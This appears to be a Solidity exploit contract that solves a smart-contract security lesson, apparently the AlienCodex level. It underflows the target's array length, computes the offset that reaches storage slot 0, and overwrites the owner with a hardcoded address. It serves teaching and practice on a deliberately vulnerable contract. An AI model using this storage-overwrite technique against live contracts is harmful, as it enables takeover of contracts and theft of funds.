// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

import "../lessons/19-AlienCodex.sol";

contract AlienCodexAttack {
    AlienCodex alienCodex;
    uint256 constant MAX_UINT = 2**256 - 1;

    constructor(address alienCodexAddress) public {
        alienCodex = AlienCodex(alienCodexAddress);
    }

    function attack() public {
        // make contact
        alienCodex.make_contact();
        // trigger underflow
        alienCodex.retract();
        // get offset to access storage slot 0 using codex array
        uint256 arraySlot = 1;
        uint256 codexIndexZeroSlot = uint256(keccak256(abi.encode(arraySlot)));
        uint256 offset = MAX_UINT - codexIndexZeroSlot + 1;
        // change data at slot 0 in alienCodex to change owner
        bytes32 updatedData = 0x00000000000000000000000170997970C51812dc3A010C7d01b50e0d17dc79C8;
        alienCodex.revise(offset, updatedData);
    }
}
